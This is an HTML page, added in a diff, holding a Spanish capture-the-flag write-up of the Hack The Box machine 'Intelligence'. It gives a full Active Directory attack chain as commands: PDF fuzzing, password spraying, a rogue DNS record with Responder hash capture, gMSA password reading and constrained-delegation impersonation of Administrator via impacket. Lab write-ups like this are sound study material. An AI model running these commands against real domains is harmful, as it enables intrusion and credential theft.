@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Intelligence HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/intelligence/pasted-image-20260313001937.png" alt="Intelligence HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Intelligence</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>pdf</span>
+            <span>LDAP</span>
+            <span>BloodHound</span>
+            <span>gMSA</span>
+            <span>allowedtodelegate</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing del patrón de documentos web publicados</li>
+            <li><code>Explotación</code>: Password Spray con usuarios extraídos de metadatos de PDFs y contraseña filtrada en un documento</li>
+            <li><code>Movimiento lateral</code>: Share <code>IT</code> revela un script <code>PowerShell</code>; DNS malicioso y <code>Responder</code> capturan un hash <code>NTLMv2</code></li>
+            <li><code>Movimiento lateral</code>: ACL <code>ReadGMSAPassword</code></li>
+            <li><code>Escalada de Privilegios</code>: ACL <code>AllowedToDelegate</code> para impersonar <code>Administrator</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313003404.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <pre><code># Vemos en la web un patrón de ficheros para fuzzear</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313011512.png" alt="Intelligence HTB" />
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313011502.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Fuzzear documentos</h3>
+            <pre><code>wfuzz -c --hc=404 -t 100 -w anos -w meses -w dias http://dc/documents/FUZZ-FUZ2Z-FUZ3Z-upload.pdf
+# Vemos que existen muchos ficheros en el directorio</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313011544.png" alt="Intelligence HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Descargar todos los.pdf de la web</h3>
+            <pre><code># One Liner
+for year in {2019..2021}; do for month in {01..12};do for day in {01..31};do echo &quot;http://10.129.95.154/documents/$year-$month-$day-upload.pdf&quot;; done; done; done | xargs -n 1 -P 20 wget
+
+# Two Liner
+for year in {2019..2021}; for month in {01..12}; for day in {01..31}; echo http://dc/documents/$year-$month-$day-upload.pdf &gt;&gt; urls
+
+cat urls | xargs -n 1 -P 20 wget</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Leer metadatos de los 100 pdfs y hacer lista de posibles usuarios</h3>
+            <pre><code>exiftool *.pdf | grep Creator | cut -d : -f2 | sort -u | sponge users</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313125658.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Convertir pdfs a txt para batearlos</h3>
+            <pre><code># pdftotext file.pdf
+ls | grep .pdf | xargs -n1  pdftotext
+
+bat *.txt
+# Contraseña: NewIntelligenceCorpUser9876</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313130912.png" alt="Intelligence HTB" />
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313130950.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Password Spray</h3>
+            <pre><code>nxc smb dc -u users -p &#x27;NewIntelligenceCorpUser9876&#x27; 
+
+# [+] Tiffany.Molina:NewIntelligenceCorpUser9876</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <div class="code-card">
+            <h3>IT share</h3>
+            <pre><code>smbclient //dc/IT/ -U Tiffany.Molina -c &quot;recurse; prompt; mget *;&quot;
+# downdetector.ps1 -&gt; Ejecuta cada 5 min una peticion con las credenciales de Ted.Graves a un DNS Record que comiencen por el nombre &quot;web&quot; </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313144940.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Añadir DNS Record al dominio</h3>
+            <pre><code>dnstool -u &#x27;intelligence.htb\Tiffany.Molina&#x27; -p NewIntelligenceCorpUser9876 -r webalvaro -a add -t A -d 10.10.16.69 10.129.95.154</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313145240.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Responder</h3>
+            <pre><code>responder -I tun0 -v</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313145257.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Crackear hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; Ted.Graves:Mr.Teddy</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260313145358.png" alt="Intelligence HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260314003745.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Leer la contraseña GMSA</h3>
+            <pre><code>nxc ldap 10.129.95.154 -u &#x27;Ted.Graves&#x27; -p &#x27;Mr.Teddy&#x27; --gmsa
+# Credenciales -&gt; svc_int$:d5538dca5ba2ff329c9df39ef130f439</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260314021024.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Enumerar SPN asociadas a servicios delegables con credenciales del dominio</h3>
+            <pre><code>pywerview get-netcomputer -u &#x27;Ted.Graves&#x27; -p &#x27;Mr.Teddy&#x27; -t 10.129.95.154 --full-data
+# Usuario: svc_int
+# AllowedToDelegateTo SPN: WWW/dc.intelligence.htb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260314025653.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Impersonar al usuario Administrator</h3>
+            <pre><code>impacket-getST -spn &#x27;WWW/dc.intelligence.htb&#x27; -impersonate &#x27;Administrator&#x27; -hashes :d5538dca5ba2ff329c9df39ef130f439 &#x27;intelligence.htb/svc_int$&#x27;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Exportar credenciales Administrator</h3>
+            <pre><code>export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260314022617.png" alt="Intelligence HTB" />
+          <div class="code-card">
+            <h3>Acceso PSEXEC con Kerberos</h3>
+            <pre><code>impacket-psexec dc.intelligence.htb -k -no-pass</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/intelligence/pasted-image-20260314022703.png" alt="Intelligence HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>pdf</span>
+            <span>LDAP</span>
+            <span>BloodHound</span>
+            <span>gMSA</span>
+            <span>allowedtodelegate</span>
+            <span>readgmsapassword</span>
+            <span>psexec_Kerberos</span>
+            <span>dns</span>
+            <span>Responder</span>
+            <span>script_sh</span>
+            <span>bash_scripting</span>
+            <span>exiftool</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
